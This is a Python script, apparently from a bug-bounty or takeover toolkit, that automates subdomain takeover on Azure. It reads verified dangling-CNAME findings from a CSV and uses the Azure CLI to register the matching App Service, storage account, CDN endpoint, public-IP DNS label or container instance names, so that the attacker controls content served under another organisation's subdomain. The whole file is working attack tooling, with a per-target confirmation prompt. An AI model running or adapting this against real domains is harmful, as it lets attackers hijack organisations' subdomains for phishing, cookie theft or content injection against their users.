#!/usr/bin/env python3
"""
Azure Services Auto-Claimer
Automatically claims vulnerable Azure subdomains

AUTOMATED CLAIMING (9 services):
✅ Azure App Service (azurewebsites.net) - FREE F1 tier
✅ Azure Blob Storage (blob.core.windows.net) - ~$0.02/month
✅ Azure CDN (azureedge.net) - ~$0.10/month
✅ Azure Cloud Services (cloudapp.net, cloudapp.azure.com) - FREE (Public IP)
✅ Azure Container Instances (azurecontainer.io) - ~$0.01/hour
✅ Azure Table Storage (table.core.windows.net) - ~$0.02/month
✅ Azure Queue Storage (queue.core.windows.net) - ~$0.02/month
✅ Azure File Storage (file.core.windows.net) - ~$0.02/month

MANUAL CLAIMING (5 services - too expensive or complex):
⚠️ Traffic Manager (trafficmanager.net) - ~$0.54/month
⚠️ Redis Cache (redis.cache.windows.net) - ~$16/month
⚠️ Container Registry (azurecr.io) - ~$5/month
⚠️ SQL Database (database.windows.net) - ~$5/month
⚠️ HDInsight (azurehdinsight.net) - ~$100+/month
"""

import subprocess
import json
import sys
import time
import re
from pathlib import Path

RESULTS_FOLDER = Path.home() / "Desktop" / "Subdomain_Takeover_Results"
POC_FOLDER = RESULTS_FOLDER / "PoC_Files"
VERIFIED_CSV = RESULTS_FOLDER / "Verified_Vulnerabilities" / "verified_vulnerabilities.csv"


def check_azure_cli():
    """Check if Azure CLI is installed"""
    try:
        result = subprocess.run(
            ['az', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            print(f"✅ Azure CLI found")
            return True
        else:
            print("❌ Azure CLI not working properly")
            return False
    except FileNotFoundError:
        print("❌ Azure CLI not installed")
        print("\nInstall with:")
        print("  brew update && brew install azure-cli")
        print("  az login")
        return False
    except Exception as e:
        print(f"❌ Error checking Azure CLI: {e}")
        return False


def check_azure_login():
    """Check if logged into Azure"""
    try:
        result = subprocess.run(
            ['az', 'account', 'show'],
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.returncode == 0:
            account = json.loads(result.stdout)
            print(f"✅ Logged into Azure")
            print(f"   Subscription: {account['name']}")
            print(f"   User: {account['user']['name']}")
            return True
        else:
            print("❌ Not logged into Azure")
            print("\nRun: az login")
            return False
    except Exception as e:
        print(f"❌ Error checking login: {e}")
        return False


# Azure service claiming functions

def claim_app_service(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure App Service (azurewebsites.net)

    CNAME format: <name>.azurewebsites.net
    """
    # Extract app name from CNAME
    match = re.match(r'^([^.]+)\.azurewebsites\.net$', cname)
    if not match:
        print(f"   ❌ Could not parse App Service CNAME: {cname}")
        return False

    app_name = match.group(1)

    print(f"\n🎯 Claiming Azure App Service:")
    print(f"   Subdomain: {subdomain}")
    print(f"   App Name: {app_name}")
    print(f"   Region: East US (default)")

    # Create resource group if needed
    print(f"\n📝 Step 1: Creating resource group...")
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    # Check if app name is available
    print(f"\n📝 Step 2: Checking availability...")
    result = subprocess.run([
        'az', 'webapp', 'list',
        '--query', f"[?name=='{app_name}']"
    ], capture_output=True, text=True)

    if result.returncode == 0:
        apps = json.loads(result.stdout)
        if apps:
            print(f"   ❌ App name '{app_name}' already taken")
            return False

    print(f"   ✅ App name is available!")

    # Create App Service Plan (required)
    plan_name = f"{app_name}-plan"
    print(f"\n📝 Step 3: Creating App Service Plan...")

    result = subprocess.run([
        'az', 'appservice', 'plan', 'create',
        '--name', plan_name,
        '--resource-group', resource_group,
        '--sku', 'F1',  # FREE tier!
        '--is-linux'
    ], capture_output=True, text=True, timeout=60)

    if result.returncode != 0:
        if 'already exists' not in result.stderr.lower():
            print(f"   ❌ Failed to create plan: {result.stderr}")
            return False

    print(f"   ✅ App Service Plan created")

    # Create Web App
    print(f"\n📝 Step 4: Creating Web App (this takes 1-2 minutes)...")

    result = subprocess.run([
        'az', 'webapp', 'create',
        '--name', app_name,
        '--resource-group', resource_group,
        '--plan', plan_name,
        '--runtime', 'PYTHON:3.11'
    ], capture_output=True, text=True, timeout=180)

    if result.returncode == 0:
        app_data = json.loads(result.stdout)
        default_hostname = app_data.get('defaultHostName')

        print(f"   ✅ Web App created!")
        print(f"      URL: https://{default_hostname}")
        print(f"      Status: Running")
        print(f"\n   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 Live at: https://{default_hostname}")

        return True
    else:
        print(f"   ❌ Failed to create web app: {result.stderr}")
        return False


def claim_blob_storage(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure Blob Storage (blob.core.windows.net)

    CNAME format: <storage-account>.blob.core.windows.net
    """
    # Extract storage account name
    match = re.match(r'^([^.]+)\.blob\.core\.windows\.net$', cname)
    if not match:
        print(f"   ❌ Could not parse Blob Storage CNAME: {cname}")
        return False

    storage_name = match.group(1)

    # Storage account names must be 3-24 chars, lowercase, numbers only
    storage_name = re.sub(r'[^a-z0-9]', '', storage_name.lower())[:24]

    print(f"\n🎯 Claiming Azure Blob Storage:")
    print(f"   Subdomain: {subdomain}")
    print(f"   Storage Account: {storage_name}")

    # Create resource group
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    # Check availability
    print(f"\n📝 Checking storage account availability...")
    result = subprocess.run([
        'az', 'storage', 'account', 'check-name',
        '--name', storage_name
    ], capture_output=True, text=True)

    if result.returncode == 0:
        check_result = json.loads(result.stdout)
        if not check_result.get('nameAvailable'):
            print(f"   ❌ Storage account '{storage_name}' not available")
            print(f"      Reason: {check_result.get('message')}")
            return False

    print(f"   ✅ Storage account is available!")

    # Create storage account
    print(f"\n📝 Creating storage account (1-2 minutes)...")

    result = subprocess.run([
        'az', 'storage', 'account', 'create',
        '--name', storage_name,
        '--resource-group', resource_group,
        '--location', 'eastus',
        '--sku', 'Standard_LRS',  # Cheapest option
        '--kind', 'StorageV2',
        '--allow-blob-public-access', 'true'
    ], capture_output=True, text=True, timeout=180)

    if result.returncode == 0:
        print(f"   ✅ Storage account created!")
        print(f"   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 Blob endpoint: https://{storage_name}.blob.core.windows.net")

        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


def claim_cdn(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure CDN (azureedge.net)

    CNAME format: <endpoint>.azureedge.net
    """
    match = re.match(r'^([^.]+)\.azureedge\.net$', cname)
    if not match:
        print(f"   ❌ Could not parse CDN CNAME: {cname}")
        return False

    endpoint_name = match.group(1)
    profile_name = f"{endpoint_name}-profile"

    print(f"\n🎯 Claiming Azure CDN:")
    print(f"   Subdomain: {subdomain}")
    print(f"   Endpoint: {endpoint_name}")

    # Create resource group
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    # Create CDN profile
    print(f"\n📝 Creating CDN profile...")

    result = subprocess.run([
        'az', 'cdn', 'profile', 'create',
        '--name', profile_name,
        '--resource-group', resource_group,
        '--sku', 'Standard_Microsoft'
    ], capture_output=True, text=True, timeout=60)

    if result.returncode != 0:
        if 'already exists' not in result.stderr.lower():
            print(f"   ❌ Failed: {result.stderr}")
            return False

    # Create CDN endpoint
    print(f"\n📝 Creating CDN endpoint...")

    result = subprocess.run([
        'az', 'cdn', 'endpoint', 'create',
        '--name', endpoint_name,
        '--profile-name', profile_name,
        '--resource-group', resource_group,
        '--origin', 'www.example.com',
        '--origin-host-header', 'www.example.com'
    ], capture_output=True, text=True, timeout=120)

    if result.returncode == 0:
        print(f"   ✅ CDN endpoint created!")
        print(f"   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 Live at: https://{endpoint_name}.azureedge.net")

        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


def claim_cloud_service(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure Cloud Services (cloudapp.net / cloudapp.azure.com)

    CNAME format: <name>.cloudapp.net or <name>.cloudapp.azure.com

    NOTE: Azure Cloud Services (classic) is deprecated.
    This will create a VM instead as Cloud Services are being phased out.
    """
    match = re.match(r'^([^.]+)\.cloudapp\.(net|azure\.com)$', cname)
    if not match:
        print(f"   ❌ Could not parse Cloud Service CNAME: {cname}")
        return False

    vm_name = match.group(1)[:15]  # VM names max 15 chars
    dns_label = match.group(1)

    print(f"\n🎯 Claiming Azure Cloud Service (via VM):")
    print(f"   Subdomain: {subdomain}")
    print(f"   DNS Label: {dns_label}")
    print(f"   ⚠️  Cloud Services (classic) deprecated - using VM instead")

    # Create resource group
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    # Check if DNS label is available
    print(f"\n📝 Checking DNS label availability...")
    result = subprocess.run([
        'az', 'network', 'public-ip', 'list',
        '--query', f"[?dnsSettings.domainNameLabel=='{dns_label}']"
    ], capture_output=True, text=True)

    if result.returncode == 0:
        ips = json.loads(result.stdout)
        if ips:
            print(f"   ❌ DNS label '{dns_label}' already taken")
            return False

    print(f"   ✅ DNS label is available!")

    # Create public IP with DNS label
    print(f"\n📝 Creating public IP with DNS label...")
    ip_name = f"{vm_name}-ip"

    result = subprocess.run([
        'az', 'network', 'public-ip', 'create',
        '--resource-group', resource_group,
        '--name', ip_name,
        '--dns-name', dns_label,
        '--allocation-method', 'Static',
        '--sku', 'Standard'
    ], capture_output=True, text=True, timeout=60)

    if result.returncode == 0:
        print(f"   ✅ Public IP created with DNS label!")
        print(f"   🎉 SUCCESS! DNS claimed!")
        print(f"   🌐 Live at: {dns_label}.eastus.cloudapp.azure.com")
        print(f"   💡 You can now create a VM using this IP")
        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


def claim_container_instance(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure Container Instances (azurecontainer.io)

    CNAME format: <name>.<region>.azurecontainer.io
    """
    match = re.match(r'^([^.]+)\.([^.]+)\.azurecontainer\.io$', cname)
    if not match:
        print(f"   ❌ Could not parse Container Instance CNAME: {cname}")
        return False

    container_name = match.group(1)
    region = match.group(2)

    # Map region codes
    region_map = {
        'eastus': 'eastus',
        'westus': 'westus',
        'centralus': 'centralus',
        'northeurope': 'northeurope',
        'westeurope': 'westeurope'
    }
    location = region_map.get(region, 'eastus')

    print(f"\n🎯 Claiming Azure Container Instance:")
    print(f"   Subdomain: {subdomain}")
    print(f"   Container Name: {container_name}")
    print(f"   Region: {location}")

    # Create resource group
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', location
    ], capture_output=True)

    # Create container instance with DNS label
    print(f"\n📝 Creating container instance...")

    result = subprocess.run([
        'az', 'container', 'create',
        '--resource-group', resource_group,
        '--name', container_name,
        '--image', 'nginx:latest',  # Simple web server
        '--dns-name-label', container_name,
        '--ports', '80',
        '--cpu', '1',
        '--memory', '1',  # 1GB RAM (minimum)
        '--location', location
    ], capture_output=True, text=True, timeout=180)

    if result.returncode == 0:
        container_data = json.loads(result.stdout)
        fqdn = container_data.get('ipAddress', {}).get('fqdn')

        print(f"   ✅ Container instance created!")
        print(f"   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 Live at: http://{fqdn}")
        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


def claim_table_storage(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure Table Storage (table.core.windows.net)

    CNAME format: <storage-account>.table.core.windows.net
    """
    match = re.match(r'^([^.]+)\.table\.core\.windows\.net$', cname)
    if not match:
        print(f"   ❌ Could not parse Table Storage CNAME: {cname}")
        return False

    storage_name = match.group(1)
    storage_name = re.sub(r'[^a-z0-9]', '', storage_name.lower())[:24]

    print(f"\n🎯 Claiming Azure Table Storage:")
    print(f"   Subdomain: {subdomain}")
    print(f"   Storage Account: {storage_name}")

    # Create resource group
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    # Check availability
    print(f"\n📝 Checking storage account availability...")
    result = subprocess.run([
        'az', 'storage', 'account', 'check-name',
        '--name', storage_name
    ], capture_output=True, text=True)

    if result.returncode == 0:
        check_result = json.loads(result.stdout)
        if not check_result.get('nameAvailable'):
            print(f"   ❌ Storage account '{storage_name}' not available")
            return False

    print(f"   ✅ Storage account is available!")

    # Create storage account
    print(f"\n📝 Creating storage account...")

    result = subprocess.run([
        'az', 'storage', 'account', 'create',
        '--name', storage_name,
        '--resource-group', resource_group,
        '--location', 'eastus',
        '--sku', 'Standard_LRS',
        '--kind', 'StorageV2'
    ], capture_output=True, text=True, timeout=180)

    if result.returncode == 0:
        print(f"   ✅ Storage account created!")
        print(f"   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 Table endpoint: https://{storage_name}.table.core.windows.net")
        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


def claim_queue_storage(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure Queue Storage (queue.core.windows.net)

    CNAME format: <storage-account>.queue.core.windows.net
    """
    match = re.match(r'^([^.]+)\.queue\.core\.windows\.net$', cname)
    if not match:
        print(f"   ❌ Could not parse Queue Storage CNAME: {cname}")
        return False

    storage_name = match.group(1)
    storage_name = re.sub(r'[^a-z0-9]', '', storage_name.lower())[:24]

    print(f"\n🎯 Claiming Azure Queue Storage:")
    print(f"   Subdomain: {subdomain}")
    print(f"   Storage Account: {storage_name}")

    # Same process as Table Storage
    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    print(f"\n📝 Checking storage account availability...")
    result = subprocess.run([
        'az', 'storage', 'account', 'check-name',
        '--name', storage_name
    ], capture_output=True, text=True)

    if result.returncode == 0:
        check_result = json.loads(result.stdout)
        if not check_result.get('nameAvailable'):
            print(f"   ❌ Storage account '{storage_name}' not available")
            return False

    print(f"   ✅ Storage account is available!")

    print(f"\n📝 Creating storage account...")
    result = subprocess.run([
        'az', 'storage', 'account', 'create',
        '--name', storage_name,
        '--resource-group', resource_group,
        '--location', 'eastus',
        '--sku', 'Standard_LRS',
        '--kind', 'StorageV2'
    ], capture_output=True, text=True, timeout=180)

    if result.returncode == 0:
        print(f"   ✅ Storage account created!")
        print(f"   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 Queue endpoint: https://{storage_name}.queue.core.windows.net")
        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


def claim_file_storage(subdomain, cname, resource_group="takeover-rg"):
    """
    Claim Azure File Storage (file.core.windows.net)

    CNAME format: <storage-account>.file.core.windows.net
    """
    match = re.match(r'^([^.]+)\.file\.core\.windows\.net$', cname)
    if not match:
        print(f"   ❌ Could not parse File Storage CNAME: {cname}")
        return False

    storage_name = match.group(1)
    storage_name = re.sub(r'[^a-z0-9]', '', storage_name.lower())[:24]

    print(f"\n🎯 Claiming Azure File Storage:")
    print(f"   Subdomain: {subdomain}")
    print(f"   Storage Account: {storage_name}")

    subprocess.run([
        'az', 'group', 'create',
        '--name', resource_group,
        '--location', 'eastus'
    ], capture_output=True)

    print(f"\n📝 Checking storage account availability...")
    result = subprocess.run([
        'az', 'storage', 'account', 'check-name',
        '--name', storage_name
    ], capture_output=True, text=True)

    if result.returncode == 0:
        check_result = json.loads(result.stdout)
        if not check_result.get('nameAvailable'):
            print(f"   ❌ Storage account '{storage_name}' not available")
            return False

    print(f"   ✅ Storage account is available!")

    print(f"\n📝 Creating storage account...")
    result = subprocess.run([
        'az', 'storage', 'account', 'create',
        '--name', storage_name,
        '--resource-group', resource_group,
        '--location', 'eastus',
        '--sku', 'Standard_LRS',
        '--kind', 'StorageV2'
    ], capture_output=True, text=True, timeout=180)

    if result.returncode == 0:
        print(f"   ✅ Storage account created!")
        print(f"   🎉 SUCCESS! Subdomain claimed!")
        print(f"   🌐 File endpoint: https://{storage_name}.file.core.windows.net")
        return True
    else:
        print(f"   ❌ Failed: {result.stderr}")
        return False


# Service detection and routing

AZURE_SERVICES = {
    'azurewebsites.net': {
        'name': 'Azure App Service / Web Apps',
        'claimer': claim_app_service,
        'cost': 'FREE (F1 tier)',
        'difficulty': 'Easy'
    },
    'blob.core.windows.net': {
        'name': 'Azure Blob Storage',
        'claimer': claim_blob_storage,
        'cost': '~$0.02/month',
        'difficulty': 'Easy'
    },
    'azureedge.net': {
        'name': 'Azure CDN',
        'claimer': claim_cdn,
        'cost': '~$0.10/month',
        'difficulty': 'Medium'
    },
    'cloudapp.net': {
        'name': 'Azure Cloud Services (Classic)',
        'claimer': claim_cloud_service,
        'cost': 'FREE (Public IP only)',
        'difficulty': 'Easy'
    },
    'cloudapp.azure.com': {
        'name': 'Azure Cloud Services',
        'claimer': claim_cloud_service,
        'cost': 'FREE (Public IP only)',
        'difficulty': 'Easy'
    },
    'azurecontainer.io': {
        'name': 'Azure Container Instances',
        'claimer': claim_container_instance,
        'cost': '~$0.0025/vCPU-hour + $0.00025/GB-hour',
        'difficulty': 'Easy'
    },
    'table.core.windows.net': {
        'name': 'Azure Table Storage',
        'claimer': claim_table_storage,
        'cost': '~$0.02/month',
        'difficulty': 'Easy'
    },
    'queue.core.windows.net': {
        'name': 'Azure Queue Storage',
        'claimer': claim_queue_storage,
        'cost': '~$0.02/month',
        'difficulty': 'Easy'
    },
    'file.core.windows.net': {
        'name': 'Azure File Storage',
        'claimer': claim_file_storage,
        'cost': '~$0.02/month',
        'difficulty': 'Easy'
    },
    'trafficmanager.net': {
        'name': 'Azure Traffic Manager',
        'claimer': None,  # More complex, requires more setup
        'cost': '~$0.54/month',
        'difficulty': 'Hard'
    },
    'redis.cache.windows.net': {
        'name': 'Azure Redis Cache',
        'claimer': None,  # Expensive, manual for now
        'cost': '~$16/month minimum',
        'difficulty': 'Hard'
    },
    'azurecr.io': {
        'name': 'Azure Container Registry',
        'claimer': None,  # Requires custom domain setup
        'cost': '~$5/month (Basic)',
        'difficulty': 'Medium'
    },
    'database.windows.net': {
        'name': 'Azure SQL Database',
        'claimer': None,  # Expensive, manual
        'cost': '~$5/month minimum',
        'difficulty': 'Hard'
    },
    'azurehdinsight.net': {
        'name': 'Azure HDInsight',
        'claimer': None,  # Very expensive
        'cost': '~$100+/month',
        'difficulty': 'Hard'
    },
}


def detect_azure_service(cname):
    """Detect which Azure service from CNAME"""
    for pattern, service_info in AZURE_SERVICES.items():
        if pattern in cname.lower():
            return service_info
    return None


def find_azure_vulnerabilities():
    """Find Azure vulnerabilities from verified results"""
    import csv

    if not VERIFIED_CSV.exists():
        print(f"❌ No verified results found")
        return []

    azure_vulns = []

    with open(VERIFIED_CSV, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row.get('vulnerable', '').lower() == 'true':
                cname = row.get('cname', '').lower()

                # Check if it's an Azure service
                if any(svc in cname for svc in AZURE_SERVICES.keys()):
                    azure_vulns.append({
                        'subdomain': row.get('subdomain'),
                        'cname': cname,
                        'service': row.get('service'),
                        'evidence': row.get('evidence', '')
                    })

    return azure_vulns


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║          AZURE AUTO-CLAIMER                                  ║
╚══════════════════════════════════════════════════════════════╝
""")

    # Check prerequisites
    print("🔍 Checking prerequisites...\n")

    if not check_azure_cli():
        sys.exit(1)

    if not check_azure_login():
        sys.exit(1)

    # Find Azure vulnerabilities
    print("\n🔍 Finding Azure vulnerabilities...\n")
    azure_vulns = find_azure_vulnerabilities()

    if not azure_vulns:
        print("❌ No Azure vulnerabilities found")
        print("   Run a scan first!")
        sys.exit(0)

    # Group by service type
    by_service = {}
    for vuln in azure_vulns:
        service_info = detect_azure_service(vuln['cname'])
        if service_info:
            service_name = service_info['name']
            if service_name not in by_service:
                by_service[service_name] = []
            by_service[service_name].append(vuln)

    print(f"✅ Found {len(azure_vulns)} Azure vulnerabilities:\n")
    for service_name, vulns in by_service.items():
        print(f"   • {service_name}: {len(vulns)}")

    print("\n" + "="*80)

    # Process each vulnerability
    for idx, vuln in enumerate(azure_vulns, 1):
        print(f"\n[{idx}/{len(azure_vulns)}] Processing: {vuln['subdomain']}")
        print(f"   CNAME: {vuln['cname']}")

        service_info = detect_azure_service(vuln['cname'])

        if not service_info:
            print(f"   ❌ Unknown Azure service")
            continue

        print(f"   Service: {service_info['name']}")
        print(f"   Cost: {service_info['cost']}")
        print(f"   Difficulty: {service_info['difficulty']}")

        if not service_info['claimer']:
            print(f"   ⚠️  Auto-claiming not supported yet (manual only)")
            print(f"   See Azure Console to claim manually")
            continue

        # Ask for confirmation
        response = input(f"\n   Claim this subdomain? (yes/no): ").strip().lower()

        if response == 'yes':
            success = service_info['claimer'](
                vuln['subdomain'],
                vuln['cname']
            )

            if success:
                print(f"\n   🎉 Claimed successfully!")
            else:
                print(f"\n   ❌ Failed to claim")
        else:
            print(f"   ⏭️  Skipped")

        print("\n" + "="*80)

    print("\n✅ Auto-claiming complete!")
    print("\n💡 TIP: Check Azure Portal to see your resources")
    print(f"   https://portal.azure.com/")


if __name__ == "__main__":
    main()
